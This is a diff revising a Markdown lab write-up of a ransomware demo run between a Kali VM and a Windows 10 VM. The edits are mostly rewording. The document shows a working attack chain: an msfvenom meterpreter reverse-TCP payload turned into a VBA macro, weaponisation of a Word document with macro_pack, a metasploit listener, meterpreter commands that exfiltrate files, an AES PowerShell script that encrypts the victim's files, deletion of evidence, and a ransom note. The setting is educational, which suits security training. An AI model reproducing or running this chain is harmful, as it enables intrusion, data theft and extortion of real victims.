@@ -1,39 +1,39 @@
 # Ransomware Attack Demo: Basic Spearphishing and Exfiltration
-This document describes the setup and execution of a demo showing a simple example of a **Ransomware Attack**.
+This document outlines the setup and execution of a demonstration showcasing a rudimentary example of a **Ransomware Attack**.
 
 <br/>
 
 ## Attack Description
-In the scenario depicted below, the adversary will inject in a carefully constructed **Word document** a **VBA Script** as an obfuscated payload. The adversary will then send this document to the victim through a tailored and customized mail message ([Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001/)).<br/>
-It is assumed that the victim will fall prey of the **Spearphishing Attack** and will download and open the document. Upon the opening, Microsoft Word will **execute** the VBA Script ([Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059/005/)): this allows the adversary to have a **reverse shell** running on the victims platform and remotely controlled by the adversary itself.<br/>
-The attacker will then **exfiltrate** victim's files over the established channel ([Exfiltration Over C2 Channel](https://attack.mitre.org/techniques/T1041/)) and **encrypt** them in order to **compromise** their **integrity** and to demand a **ransom** ([Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486/)).
+In the scenario presented below, the adversary will inject a meticulously crafted  **Word document** with a **VBA Script** as an obfuscated payload. Subsequently, the adversary will dispatch this document to the victim via a tailored and customized email message ([Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001/)).<br/>
+It is presupposed that the victim will succumb to the **Spearphishing Attack** and download and open the document. Upon opening, Microsoft Word will **execute** the VBA Script ([Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059/005/)), enabling the adversary to establish a **reverse shell** on the victim’s platform and remotely control it.<br/>
+The attacker will then **exfiltrate** the victim’s files through the established channel ([Exfiltration Over C2 Channel](https://attack.mitre.org/techniques/T1041/)) and **encrypt** them to **compromise** their **integrity** and demand a **ransom** ([Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486/)).
 
 <br/>
 
 ## Threat Model
-The **Threat Model** necessary for this attack requires the adversary to
-* know the e-mail address of the victim; 
-* lure the victim to open the Spearphishing Attachment;
-* establish a TCP connection with the victim's machine;
-* acquire enough privileges on the victim's system in order to execute exfiltration and encryption commands.
+The necessary **Threat Model** for this attack entails the adversary possessing the following capabilities:
+* knowledge of the victim’s email address;
+* luring the victim to open the Spearphishing Attachment;
+* establishing a TCP connection with the victim’s machine;
+* acquiring sufficient privileges on the victim’s system to execute exfiltration and encryption commands.
 
 <br/>
 
 ## Setup
-To perform the attack described above I used two Virtual Machines (referenced to as VMs in the following):
-1. the **attacker** is associated with a **Kali Linux VM**, with IPv4 Address `192.168.56.102`;
-2. the **victim** runs a **Windows 10 VM**, with IPv4 Address `192.168.56.101`.
+To execute the attack described above, I utilized two Virtual Machines (referenced as VMs in the following):
+1. the **attacker** is associated with a **Kali Linux VM**, with an IPv4 Address of `192.168.56.102`;
+2. the **victim** runs a **Windows 10 VM**, with an IPv4 Address of `192.168.56.101`.
 
-Both VMs have their network adapter configured as "Attached to: **Host-only Adapter**" in order to just allow intra-communication within the local network.
+Both VMs have their network adapter configured as "Attached to: **Host-only Adapter**" to enable only intra-network communication.
 
 <br/>
 
 ## Preliminaries
-In order to create the Word document containing the malicious VBA Script, I have used `msfvenom` and a tool called [macro_pack](https://github.com/sevagas/macro_pack); in particular, I execute the following command on the Kali VM:
+To create a Word document containing a malicious VBA script, I employed `msfvenom` and a tool called [macro_pack](https://github.com/sevagas/macro_pack); specifically, I executed the following command on the Kali VM:
 ```
 msfvenom -p windows/meterpreter/reverse_tcp -a x86 --platform windows LHOST=192.168.56.102 LPORT=4444 -f vba > reverse_shell_exploit.vba
 ```
-In this way, I am able to obtain a VBA Script that, when executed, will try to establish a TCP connection to the pair `<IPv4, Port> = <192.168.56.102, 4444>`. To make it more effective, I have edited it in order to launch a thread to do so:
+This command generates a VBA script that attempts to establish a TCP connection to the pair `<IPv4, Port> = <192.168.56.102, 4444>`. To enhance its effectiveness, I modified the script to launch a thread to manage this connection:
 ```vb
 #If VBA7 Then
     Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As Long, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
@@ -96,26 +96,26 @@ Private Sub Workbook_Open()
     Document_Open
 End Sub
 ```
-To then inject this payload inside a Word document I use `macro_pack`, by running the following command:
+To inject this payload into a Word document, I used `macro_pack` by executing the following command:
 ```
 macro_pack.exe -f reverse_shell_exploit.vba -o -G malicious.docm
 ```
 ![Photo of Mountain](images/mountain.jpg)
-> **Note:** As stated by the author of this tool, a Windows platform with the right MS Office applications installed is required for Office documents automatic generation or trojan features, so I indeed needed to run the `macro_pack` command on an appropriate Windows VM (not previously mentioned for ease of global understanding).
+> **Note:** As stated by the author of this tool, a Windows platform with the right MS Office applications installed is required for Office documents automatic generation or trojan features. Therefore, I ran the `macro_pack` command on an appropriate Windows VM (not previously mentioned for clarity).
 
 <br/>
 
 ## Spearphishing
-Once the adversary generates the `malicious.docm` document, he needs to inject it into the victim's environment. I tried to perform a Spoofed Spearphishing Attack using [The Social-Engineer Toolkit (SET)](https://github.com/trustedsec/social-engineer-toolkit) and replicating the `units.it` domain using [hMailServer]( https://www.hmailserver.com), but there were compatibility issues as stated [here](https://github.com/trustedsec/social-engineer-toolkit/issues/810).<br/>
-Therefore I assumed that the adversary managed to acquire **Valid Credentials** for one **Domain Account** of the `units.it` domain (additional Threat Model), so to be able to send the required Spearphishing Attachment to the victim.
+Once the adversary generates the `malicious.docm` document, it must be injected into the victim’s environment. I attempted to execute a Spoofed Spearphishing Attack using [The Social-Engineer Toolkit (SET)](https://github.com/trustedsec/social-engineer-toolkit) and replicating the `units.it` domain using [hMailServer]( https://www.hmailserver.com). However, compatibility issues were encountered, as reported [here](https://github.com/trustedsec/social-engineer-toolkit/issues/810).<br/>
+Consequently, I postulated that the adversary successfully acquired **Valid Credentials** for one **Domain Account** of the `units.it` domain (an additional Threat Model), to enable the transmission of the requisite Spearphishing Attachment to the victim.
 
 ![Photo of Mountain](images/mountain.jpg)
 
 <br/>
 
 ## Initial Access & Execution
-In order to have a **reverse shell** at the victim's side connected to a remote shell client at the adversary's side, the attacker needs to launch a **listener** (prior to the opening of the `malicious.docm` document).<br/>
-To do so, I have created a handler configuration file for `metasploit`, namely `handler.rc`, to instruct it to listen at port `4444` for TCP connections:
+To establish a **reverse shell** at the victim’s side connected to a remote shell client at the adversary’s side, the attacker must launch a **listener** prior to the opening of the `malicious.docm` document.<br/>
+To accomplish this, I have created a handler configuration file for `metasploit`, namely `handler.rc`, to instruct it to listen at port `4444` for TCP connections:
 ```
 use exploit/multi/handler
 set payload windows/x64/meterpreter/reverse_tcp
@@ -135,14 +135,14 @@ Then the listener is launched using the command:
 ```
 msfconsole -q -r handler.rc
 ```
-When the victim opens the `malicious.docm` document, the VBA Script will attempt to open a TCP connection to the adversary-controlled listener, by continuously migrating among processes running on the victim's machine, or by spawning new ones, until a TCP connection is successfully established.
+Upon the victim’s opening of the `malicious.docm` document, the VBA script will attempt to establish a TCP connection to the adversary-controlled listener by continuously migrating among processes running on the victim’s machine or spawning new ones until a successful connection is achieved.
 
 ![Photo of Mountain](images/mountain.jpg)
 
 <br/>
 
 ## Exfiltration
-From the remote shell client, the adversary can now move around the victim's File System. Depending on the **privilege level** and **access rights** the adversary is capable of acquiring on the victim's environment, the attacker might not be able to access all resources. I assumed that critical resources where inside the `C:\Users\enrico\Desktop\Very_Important_Stuff\` directory, so the adversary can exfiltrate them by executing the following command:
+From the remote shell client, the adversary can now navigate the victim’s File System. Depending on the **privilege level** and **access rights** the adversary is capable of acquiring on the victim's environment, the attacker may not be able to access all resources. I assumed that critical resources were located within the `C:\Users\enrico\Desktop\Very_Important_Stuff\` directory, so the adversary could exfiltrate them by executing the following command:
 ```
 download -r C:\\Users\\enrico\\Desktop\\Very_Important_Stuff\\ /home/kali/Desktop/Exfiltrated
 ```
@@ -152,7 +152,7 @@ download -r C:\\Users\\enrico\\Desktop\\Very_Important_Stuff\\ /home/kali/Deskto
 <br/>
 
 ## Impact
-To compromise the integrity of the exfiltrated files in order to make them unusable by the victim, I have created this Powershell script:
+To compromise the integrity of the exfiltrated files, rendering them unusable to the victim, I have developed a Powershell script:
 ```powershell
 # Generate a random AES encryption key and IV
 $key = New-Object byte[] 32
@@ -207,26 +207,26 @@ Get-ChildItem -Path $targetFolder -File -Recurse | ForEach-Object {
 
 Write-Host "Encryption complete. Files are now unreadable."
 ```
-This script needs to be uploaded into an adversary-chosen location on the victim's platform:
+This script must be uploaded to an adversary-selected location on the victim’s platform:
 ```
 upload /home/kali/Desktop/encrypt.ps1 C:\\Users\\enrico\\Documents\\encrypt.ps1
 ```
-and then executed:
+and subsequently executed:
 ```
 execute -f powershell.exe -a "-ExecutionPolicy Bypass -File C:\\Users\\enrico\\Documents\\encrypt.ps1"
 ```
-To avoid leaving traces, I also exfiltrate the encryption/decryption key
+To minimise the likelihood of leaving traces, I also exfiltrate the encryption/decryption key:
 ```
-download -r C:\\Users\\enrico\\Documents\\encryption_key.bin /home/kali/Desktop/Exfiltrated
+download C:\\Users\\enrico\\Documents\\encryption_key.bin /home/kali/Desktop/Exfiltrated
 ```
-and remove from the victims machine both the key and the Powershell script:
+and remove both the key and the Powershell script from the victim’s machine:
 ```
-rm C:\\Users\\enrico\\Documents\\encrypt.ps1"
-rm C:\\Users\\enrico\\Documents\\encryption_key.bin"
+rm C:\\Users\\enrico\\Documents\\encryption_key.bin
+rm C:\\Users\\enrico\\Documents\\encrypt.ps1
 ```
-To inform the victim of the compromise and demand a ransom, I leave the following message as a `README.txt` file inside the disrupted folder:
+To inform the victim of the compromise and demand a ransom, I leave the following message as a `README.txt` file within the disrupted folder:
 ```
-execute -f cmd.exe -a "/c echo Your files have been encrypted. Contact your.worst.enemy@pj5.w49ol.ru to recover them. > C:\\Users\\enrico\\Documents\\README.txt"
+execute -f cmd.exe -a "/c echo Your files have been encrypted. Contact your.worst.enemy@pj5.w49ol.ru to recover them. > C:\\Users\\enrico\\Desktop\\Very_Important_Stuff\\README.txt"
 ```
 
 ![Photo of Mountain](images/mountain.jpg)
@@ -234,7 +234,7 @@ execute -f cmd.exe -a "/c echo Your files have been encrypted. Contact your.wors
 <br/>
 
 ## Credits
-- I have taken inspiration for this attack by following [Lockard Security](https://www.youtube.com/@lockardsecurity/videos) Youtube channel.
+- I have drawn inspiration for this attack from the [Lockard Security](https://www.youtube.com/@lockardsecurity/videos) Youtube channel.
 - I have followed [this](https://www.youtube.com/watch?v=UTd8mL2itUo) tutorial for installing Microsoft Word LTSC 2021 on the Windows 10 VM.
 - The setup of the custom SMTP Server was based on a [SMTP Server setup guide](https://mailtrap.io/blog/setup-smtp-server/) of the [Mailtrap](https://mailtrap.io/blog/) blog.
-- I have learnt how to write en encryption script in Powershell essentially by following the [PoshCodex](https://www.poshcodex.co.uk/) blog and, in particular, the [Part 1](https://www.poshcodex.co.uk/2024/11/14/powershell-working-with-aes-encryption-part-1/) and [Part 2](https://www.poshcodex.co.uk/2024/12/07/powershell-working-with-aes-encryption-part-2/) of the "Powershell: Working with AES encryption" blog post.
+- I have learnt how to write en encryption script in Powershell essentially by following the [PoshCodex](https://www.poshcodex.co.uk/) blog, particularly the "Powershell: Working with AES encryption" blog post, which consists of [Part 1](https://www.poshcodex.co.uk/2024/11/14/powershell-working-with-aes-encryption-part-1/) and [Part 2](https://www.poshcodex.co.uk/2024/12/07/powershell-working-with-aes-encryption-part-2/).
